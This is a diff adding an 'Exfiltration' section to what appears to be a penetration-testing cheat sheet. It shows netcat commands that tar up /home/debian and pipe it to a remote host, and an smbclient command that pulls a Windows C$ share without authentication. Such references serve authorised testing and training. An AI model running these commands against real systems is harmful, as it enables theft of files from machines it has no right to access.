@@ -10,6 +10,7 @@
 - [Credential Access](#credential-access)  
 - [Lateral Movement](#lateral-movement)  
 - [Privilege Escalation](#privilege-escalation)  
+- [Exfiltration](#exfiltration)  
 
 ---
 
@@ -254,4 +255,25 @@ smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
   <tr><td>Local Exploits</td><td>Kernel bugs, DLL hijacking, vulnerable drivers, CVE chaining</td></tr>
   <tr><td>Misconfigurations</td><td>Unquoted service paths, writable directories, insecure permissions</td></tr>
   <tr><td>Token / Role Abuse</td><td>Privileged token impersonation, cloud role escalation, SID history tricks</td></tr>
+</table>
+
+---
+
+## Exfiltration
+
+<table>
+  <tr>
+    <td><b>Exfil for Embedded Linux</b></td>
+    <td>
+      <pre><code>nc -l -p 1234 | tar xf -
+tar cf - /home/debian | nc 10.10.10.10 1234</code></pre>
+    </td>
+  </tr>
+  <tr>
+    <td><b>Exfil for Windows</b></td>
+    <td>
+      <pre><code>smbclient \\\\10.10.10.10\\C$ -p &lt;Port&gt; -N -Tc share.tar
+tar xf share.tar -C share</code></pre>
+    </td>
+  </tr>
 </table>
